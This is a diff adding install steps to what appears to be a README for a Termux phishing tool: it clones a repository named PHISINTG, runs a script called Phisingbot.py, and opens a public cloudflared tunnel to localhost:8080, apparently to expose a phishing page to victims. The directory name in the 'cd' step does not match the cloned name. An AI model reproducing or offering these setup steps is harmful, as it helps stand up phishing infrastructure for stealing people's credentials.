@@ -13,4 +13,16 @@ pkg install python -y
 
 pkg install git
 
-git clone 
+git clone https://github.com/Darkboy-creater/PHISINTG.git
+
+cd PHISINGTG
+
+ls
+python Phisingbot.py
+
+
+then open new session 
+
+type =
+pkg install cloudflared
+cloudflared tunnel --url http://localhost:8080
